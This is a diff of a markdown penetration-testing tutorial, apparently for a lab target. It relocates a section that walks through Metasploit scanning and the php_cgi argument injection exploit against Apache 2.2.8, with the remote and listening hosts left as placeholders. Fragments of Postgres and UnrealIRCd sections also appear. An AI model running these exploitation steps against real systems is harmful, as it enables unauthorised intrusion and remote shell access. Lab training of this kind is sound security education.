@@ -22,70 +22,6 @@ Payload = In this example we used the following payload = `set payload cmd/unix/
 
 4. Finally to run the exploit you can use the `run` or `exploit` command to execute it.
 
-## Apache 2.2.8
-
-1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.
-
-Example: `grep exploit search apache`
-
-2. Since we have so many Apache exploits lets use an Auxlilary scanner to search for any potential exploits we can use.
-
-`use auxiliary/scanner/http/dir_listing`
-
-`set rhosts xxx.xxx.xxx.xxx`
-
-`show options`
-
-`run`
-
-3. Since that was successful lets use an Auxlilary directory scanner to search for any potential exploits we can use.
-
-`use auxiliary/scanner/http/dir_scanner`
-
-`show options`
-
-`run`
-
-`set rhosts xxx.xxx.xxx.xxx`
-
-`run`
-
-4. Since that was successful lets use an Auxlilary file scanner to search for any potential exploits we can use.
-
-`use auxiliary/scanner/http/files_dir`
-
-`show options`
-
-`run`
-
-`set rhosts xxx.xxx.xxx.xxx`
-
-`run`
-
-5. Since that was successful lets use the verbose authorization bypass to search for any potential exploits we can use.
-
-`use auxiliary/scanner/http/verb_auth_bypass`
-
-`show options`
-
-`set rhosts xxx.xxx.xxx.xxx`
-
-`run`
-
-6. Since that was unsuccessful lets use the php_cgi injection exploit to search for any potential exploits we can use.
-
-`use exploit/multi/http/php_cgi_arg_injection`
-
-`set rhosts xxx.xxx.xxx.xxx`
-
-`show options`
-
-`set lhost xxx.xxx.xxx.xxx`
-
-`set lport 4444`
-
-`run` or `exploit`
-
 ## Postgres
 
 1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.
@@ -151,3 +87,67 @@ Example: `grep exploit search unreal`
 `set lhost xxx.xxx.xxx.xxx` (this should be your kali linux IP address)
 
 `set lport 4444` (Port on your system exploit and payload runs to create session)
+
+## Apache 2.2.8
+
+1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.
+
+Example: `grep exploit search apache`
+
+2. Since we have so many Apache exploits lets use an Auxlilary scanner to search for any potential exploits we can use.
+
+`use auxiliary/scanner/http/dir_listing`
+
+`set rhosts xxx.xxx.xxx.xxx`
+
+`show options`
+
+`run`
+
+3. Since that was successful lets use an Auxlilary directory scanner to search for any potential exploits we can use.
+
+`use auxiliary/scanner/http/dir_scanner`
+
+`show options`
+
+`run`
+
+`set rhosts xxx.xxx.xxx.xxx`
+
+`run`
+
+4. Since that was successful lets use an Auxlilary file scanner to search for any potential exploits we can use.
+
+`use auxiliary/scanner/http/files_dir`
+
+`show options`
+
+`run`
+
+`set rhosts xxx.xxx.xxx.xxx`
+
+`run`
+
+5. Since that was successful lets use the verbose authorization bypass to search for any potential exploits we can use.
+
+`use auxiliary/scanner/http/verb_auth_bypass`
+
+`show options`
+
+`set rhosts xxx.xxx.xxx.xxx`
+
+`run`
+
+6. Since that was unsuccessful lets use the php_cgi injection exploit to search for any potential exploits we can use.
+
+`use exploit/multi/http/php_cgi_arg_injection`
+
+`set rhosts xxx.xxx.xxx.xxx`
+
+`show options`
+
+`set lhost xxx.xxx.xxx.xxx`
+
+`set lport 4444`
+
+`run` or `exploit`
